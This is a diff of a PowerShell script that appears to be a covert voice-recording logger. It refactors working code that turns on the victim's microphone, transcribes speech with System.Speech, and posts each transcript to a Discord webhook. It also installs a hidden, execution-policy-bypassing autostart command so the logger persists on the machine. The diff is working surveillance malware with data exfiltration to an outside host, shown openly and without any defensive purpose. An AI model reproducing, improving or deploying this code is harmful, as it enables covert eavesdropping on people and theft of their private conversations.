@@ -52,32 +52,37 @@ function Send-Discord {
 	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $Hook  -Method Post -Body ($Body | ConvertTo-Json) };
 }
 
-Add-Type -AssemblyName System.Speech;
-$recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine;
-$grammar = New-Object System.Speech.Recognition.DictationGrammar;
-$recognizer.LoadGrammar($grammar);
-$recognizer.SetInputToDefaultAudioDevice();
+function Start-logger{
+    Add-Type -AssemblyName System.Speech;
+    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine;
+    $grammar = New-Object System.Speech.Recognition.DictationGrammar;
+    $recognizer.LoadGrammar($grammar);
+    $recognizer.SetInputToDefaultAudioDevice();
 
-$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
-Persist-Logger "voicelog" -Command $autostart -Days $DaysRun;
-
-while ($true) {
-    $result = $recognizer.Recognize();
-    if ($result) {
-        $results = $result.Text;
-        $log = ("$env:tmp\voicelog.txt");
-
-        Write-Output $results > $log;
-
-        $text = Get-Content -Path $log -Raw;
-        
-        Send-Discord $text;
-
-        switch -regex ($results) {
-            "\bnote\b" {Start-Process notepad};
-            "\bexit\b" {break};
+    while ($true) {
+        $result = $recognizer.Recognize();
+        if ($result) {
+            $results = $result.Text;
+            $log = ("$env:tmp\$name.txt");
+    
+            Write-Output $results > $log;
+    
+            $text = Get-Content -Path $log -Raw;
+            
+            Send-Discord $text;
+    
+            switch -regex ($results) {
+                "\bnote\b" {Start-Process notepad};
+                "\bexit\b" {break};
+            };
         };
     };
-};
+    
+    Clear-Content -Path $log;
+}
 
-Clear-Content -Path $log;
+$name = "voicelog"
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item' + $name +'.ps1 | Invoke-Expression;sleep 5;exit'); 
+Persist-Logger $name -Command $autostart -Days $DaysRun;
+Start-Logger
+
